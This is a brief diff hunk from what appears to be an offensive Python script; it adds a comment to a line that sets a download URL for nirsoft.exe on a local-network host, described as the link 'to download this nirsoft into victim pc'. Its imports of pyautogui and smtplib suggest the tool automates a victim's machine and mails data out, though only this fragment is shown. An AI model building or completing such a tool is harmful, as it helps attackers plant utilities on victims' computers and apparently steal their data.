@@ -3,7 +3,7 @@ import requests
 import os,pyautogui,time,smtplib
 
 
-url_to_download_from='http://192.168.201.128/nirsoft.exe'
+url_to_download_from='http://192.168.201.128/nirsoft.exe'        #your direct url to download this nirsoft into victim pc
 
 def download_file(url_to_download_from):
     
